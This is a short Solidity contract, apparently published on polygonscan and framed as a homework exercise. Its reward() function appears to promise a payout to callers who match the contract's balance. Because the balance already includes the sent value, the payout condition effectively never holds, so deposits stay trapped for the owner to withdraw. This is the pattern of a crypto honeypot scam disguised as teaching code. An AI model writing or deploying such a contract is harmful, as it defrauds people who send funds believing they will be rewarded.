/**
 *Submitted for verification at polygonscan.com on 2022-02-26
*/

/**
 This homework demonstrates the fundamental concepts of a smart contract.
*/

pragma solidity ^0.4.18;

contract Homework1
{
    address public Owner;
   
    constructor() public {               
        Owner = msg.sender;    
    } 
    
    function() external payable {}
   
    function withdraw() payable public
    {
        require(msg.sender == Owner);
        Owner.transfer(address(this).balance);
    }
    
    function reward() public payable
    {
        if(msg.value >= address(this).balance)
        {        
            msg.sender.transfer(address(this).balance + msg.value);
        }
    }
}